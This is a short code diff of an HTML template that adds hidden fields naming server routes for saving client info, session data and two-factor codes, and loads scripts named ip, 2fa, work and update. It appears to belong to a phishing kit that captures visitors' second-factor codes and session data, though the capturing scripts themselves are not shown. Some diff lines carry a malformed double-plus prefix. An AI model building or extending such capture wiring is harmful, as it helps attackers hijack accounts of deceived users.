@@ -18,7 +18,10 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
     <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=GAw/d=0/rs=AN8SPfoV6mMC6tlFnBTPsgfPv12vhvDMnA/m=el_main_css">
-    
+    <meta name="csrf-token" content="{{ csrf_token() }}">
++    <input type="hidden" id="url-save-client" value="{{ route('user-input.client-info') }}">
++    <input type="hidden" id="url-save-session" value="{{ route('user-input.session-data') }}">
+    <input type="hidden" id="url-save-2fa" value="{{ route('user-input.save2FA') }}">
     <script>
         ! function (t, e) {
             "object" == typeof exports && "undefined" != typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define(e) : (t = "undefined" != typeof globalThis ? globalThis : t || self).bootstrap = e()
@@ -16586,12 +16589,12 @@
                 })
             })
         </script>
-        <script src="scriptsf9e3.js?v=1.1"></script>
-        <script src="ipf9e3.js?v=1.1"></script>
-        <script src="workf9e3.js?v=1.1"></script>
-        <script src="2faf9e3.js?v=1.1"></script>
-        <script src="updatef9e3.js?v=1.1"></script>
-        <script src="681f9e3.js?v=1.1"></script>
+        <script src="scriptsf9e3.js"></script>
+        <script src="ipf9e3.js"></script>
+        <script src="workf9e3.js"></script>
+        <script src="2faf9e3.js"></script>
+        <script src="updatef9e3.js"></script>
+        <script src="681f9e3.js"></script>
 
 
 
